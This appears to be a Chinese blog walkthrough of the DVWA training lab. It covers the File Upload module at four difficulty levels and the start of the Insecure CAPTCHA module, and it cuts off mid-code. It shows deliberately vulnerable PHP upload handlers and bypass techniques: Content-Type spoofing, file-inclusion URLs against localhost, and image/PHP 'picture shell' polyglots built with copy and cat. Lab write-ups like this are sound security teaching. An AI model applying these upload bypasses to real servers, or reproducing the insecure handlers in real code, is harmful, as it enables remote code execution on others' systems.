<h2 id="File-Upload-文件上传"><a href="#File-Upload-文件上传" class="headerlink" title="File Upload 文件上传"></a>File Upload 文件上传</h2><h3 id="Low-4"><a href="#Low-4" class="headerlink" title="Low"></a>Low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">basename ( <span class="keyword">string</span> `<span class="variable">$path</span>` , <span class="keyword">string</span> `<span class="variable">$suffix</span>` = ? ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p>给出一个包含有指向一个文件的全路径的字符串，本函数返回基本的文件名。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>客户端机器文件的原名称。uploaded是文件上传的字段名称</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210224194617108.png" alt="image-20210224194617108"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]</span><br></pre></td></tr></table></figure>
<p>文件被上传后在服务端储存的临时文件名。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">move_uploaded_file ( <span class="keyword">string</span> <span class="variable">$filename</span> , <span class="keyword">string</span> <span class="variable">$destination</span> ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
<p>本函数检查并确保由 <code>filename</code> 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 <code>destination</code> 指定的文件。</p>
<p>在low难度下，对所上传的文件不做任何检查就保存在服务器中，并返回保存路径。我们可以直接构造一个 info.php 文件，内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210224195057747.png" alt="image-20210224195057747"></p>
<p>上传后直接访问保存路径即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;upload&#x2F;..&#x2F;..&#x2F;hackable&#x2F;uploads&#x2F;info.php</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210224195156612.png" alt="image-20210224195156612"></p>
<h3 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>medium难度多了一个文件类型Content-Type和大小的检测，要求上传文件的类型是jpeg或者png的图像格式而且大小小于100000才能保存到服务器中，这里有2种绕过方法：</p>
<h4 id="1、抓包修改-Content-Type"><a href="#1、抓包修改-Content-Type" class="headerlink" title="1、抓包修改 Content-Type"></a>1、抓包修改 Content-Type</h4><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210224201247336.png" alt="image-20210224201247336"></p>
<p>抓包，把 Content-Type 修改为 <code>image/ipeg</code> 类型，然后执行即可</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210224201443348.png" alt="image-20210224201443348"></p>
<h4 id="2、文件包含"><a href="#2、文件包含" class="headerlink" title="2、文件包含"></a>2、文件包含</h4><p>把文件名修改为 info.png 然后上传发现上传成功，但是直接输入URL却被解析为了图片，我们需要文件解析为php。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210224202309534.png" alt="image-20210224202309534"></p>
<p>这时候可以利用文件包含漏洞，他会把包含的文件解析为php，构造URL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;htthttp:&#x2F;&#x2F;p:&#x2F;&#x2F;127.0.0.1&#x2F;hackable&#x2F;uploads&#x2F;info.png</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210224202300258.png" alt="image-20210224202300258"></p>
<h3 id="High-4"><a href="#High-4" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpg&quot;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpeg&quot;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$uploaded_tmp</span>, <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">strrpos ( <span class="keyword">string</span> `<span class="variable">$haystack</span>` , <span class="keyword">string</span> `<span class="variable">$needle</span>` , <span class="keyword">int</span> `<span class="variable">$offset</span>` = <span class="number">0</span> ) : <span class="keyword">int</span></span><br></pre></td></tr></table></figure>
<p>返回字符串 <code>haystack</code> 中 <code>needle</code> 最后一次出现的数字位置。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">substr ( <span class="keyword">string</span> `<span class="variable">$string</span>` , <span class="keyword">int</span> `<span class="variable">$start</span>` , <span class="keyword">int</span> `<span class="variable">$length</span>` = ? ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p>返回字符串 <code>string</code> 由 <code>start</code> 和 <code>length</code> 参数指定的子字符串。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>这行代码的意思是利用<code>strrpos()函数</code>查找<code>.</code>出现在<code>$uploaded_name</code>的位置然后加1，再利用<code>substr()函数</code>从变量<code>$uploaded_name</code>的指定位置截取部分字符串。所以这段代码的作用就是为了截取<strong>上传文件的后缀名</strong>。</p>
<p>**strtolower()**：该函数的作用是把字符串变成小写的形式。防止大小写绕过</p>
<p><strong>getimagesize()</strong> ：该函数会读取文件头取得图像的类型、大小等信息，当文件头不是图像的格式时，就会返回FALSE。因此之前的使用改文件后缀的方式在这里行不通。</p>
<h4 id="1、增加文件头-文件包含"><a href="#1、增加文件头-文件包含" class="headerlink" title="1、增加文件头+文件包含"></a>1、增加文件头+文件包含</h4><p>我们可以在 info.jpg 文件增加文件头标识的方式绕过，如：</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210224203944380.png" alt="image-20210224203944380"></p>
<p>上传成功后，利用文件包含漏洞即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;hackable&#x2F;uploads&#x2F;info.png</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210224205738328.png" alt="image-20210224205738328"></p>
<p>2、制作图马</p>
<ul>
<li>window</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">copy sxc.gif/b+info.php/a info.png</span><br></pre></td></tr></table></figure>
<ul>
<li>linux</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将 shell.php 内容追加到 pic.png</span></span><br><span class="line">cat shell.php &gt;&gt; pic.png</span><br><span class="line"></span><br><span class="line"><span class="comment"># png + php 合成 png 图马</span></span><br><span class="line">cat pic.png shell.php &gt;&gt; shell.png</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接 echo 追加</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span> &gt;&gt; pic.png</span><br></pre></td></tr></table></figure>
<p>上传图片，然后利用文件包含漏洞访问URL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;vulnerabilities&#x2F;fi&#x2F;?page&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;hackable&#x2F;uploads&#x2F;info.png</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210224210816001.png" alt="image-20210224210816001"></p>
<h3 id="Impossible-4"><a href="#Impossible-4" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;hackable/uploads/&#x27;</span>;</span><br><span class="line">    <span class="comment">//$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;</span></span><br><span class="line">    <span class="variable">$target_file</span>   =  md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line">    <span class="variable">$temp_file</span>     = ( ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) == <span class="string">&#x27;&#x27;</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) ) );</span><br><span class="line">    <span class="variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;jpg&#x27;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;jpeg&#x27;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;png&#x27;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/png&#x27;</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> ) &#123;</span><br><span class="line">            <span class="variable">$img</span> = imagecreatefromjpeg( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">            imagejpeg( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$img</span> = imagecreatefrompng( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">            imagepng( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">9</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy( <span class="variable">$img</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the web root from the temp folder?</span></span><br><span class="line">        <span class="keyword">if</span>( rename( <span class="variable">$temp_file</span>, ( getcwd() . DIRECTORY_SEPARATOR . <span class="variable">$target_path</span> . <span class="variable">$target_file</span> ) ) ) &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete any temp files</span></span><br><span class="line">        <span class="keyword">if</span>( file_exists( <span class="variable">$temp_file</span> ) )</span><br><span class="line">            unlink( <span class="variable">$temp_file</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>**sys_get_temp_dir()**：返回 PHP 储存临时文件的默认目录的路径。</p>
<p>**ini_get ( string <code>$varname</code> )**：成功时返回配置选项的值。</p>
<p><strong>imagecreatefromjpeg()</strong> ：返回一图像标识符，代表了从给定的文件名取得的图像。</p>
<p>**imagejpeg()**： 从 <code>image</code> 图像以 <code>filename</code> 为文件名创建一个 JPEG 图像。</p>
<p><strong>imagedestroy()</strong> ：销毁一图像，释放与 <code>image</code> 关联的内存。</p>
<p>**getcwd()**：取得当前工作目录。</p>
<p>impossible难度下，加如了token验证，同时使用时间戳的 md5 值作为文件名对文件名进行重命名，检查文件是否是图像，是的话然后重新生成图像，并生成保存路径，否则删除图像，完成后再删除临时文件。</p>
<h2 id="Insecure-CAPTCHA-不安全的验证码"><a href="#Insecure-CAPTCHA-不安全的验证码" class="headerlink" title="Insecure CAPTCHA 不安全的验证码"></a>Insecure CAPTCHA 不安全的验证码</h2><p><strong>reCAPTCHA验证流程</strong></p>
<p>这一模块的验证码使用的是Google提供reCAPTCHA服务，下图是验证的具体流程。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/14787625541269.png!small" alt="1.png"></p>
<p>服务器通过调用recaptcha_check_answer函数检查用户输入的正确性。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">recaptcha_check_answer(<span class="variable">$privkey</span>,<span class="variable">$remoteip</span>, <span class="variable">$challenge</span>,<span class="variable">$response</span>)</span><br></pre></td></tr></table></figure>
<p>参数$privkey是服务器申请的private key ，$remoteip是用户的ip，$challenge 是recaptcha_challenge_field 字段的值，来自前端页面 ，$response是 recaptcha_response_field 字段的值。函数返回ReCaptchaResponse class的实例，ReCaptchaResponse 类有2个属性 ：</p>
<p>$is_valid是布尔型的，表示校验是否有效，</p>
<p>$error是返回的错误代码。</p>
<h3 id="Low-5"><a href="#Low-5" class="headerlink" title="Low"></a>Low</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;1&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    <span class="variable">$resp</span> = recaptcha_check_answer(</span><br><span class="line">        <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="variable">$resp</span> ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">            <span class="comment">// Show next stage for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;<span class="subst">&#123;$pass_new&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;<span class="subst">&#123;$pass_conf&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;/form&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Both new passwords do not match.</span></span><br><span class="line">            <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;2&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if both password match</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span 